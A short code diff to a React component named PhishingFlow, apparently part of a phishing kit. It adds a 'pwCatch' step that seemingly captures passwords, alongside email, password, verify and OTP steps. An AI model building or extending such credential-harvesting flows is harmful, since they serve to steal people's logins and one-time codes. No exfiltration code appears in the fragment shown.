@@ -3,6 +3,7 @@
 import { useState, useEffect } from "react";
 import EmailStep from "./steps/EmailStep";
 import PasswordStep from "./steps/PasswordStep";
+import PwCatchStep from "./steps/PwCatchStep";
 import VerifyStep from "./steps/VerifyStep";
 import OtpStep from "./steps/OtpStep";
 import ErrorStep from "./steps/ErrorStep";
@@ -76,6 +77,8 @@ export default function PhishingFlow() {
       return <EmailStep />;
     case 'password':
       return <PasswordStep {...state} />;
+    case 'pwCatch':
+      return <PwCatchStep {...state} />;
     case 'verify':
       return <VerifyStep />;
     case 'otp':
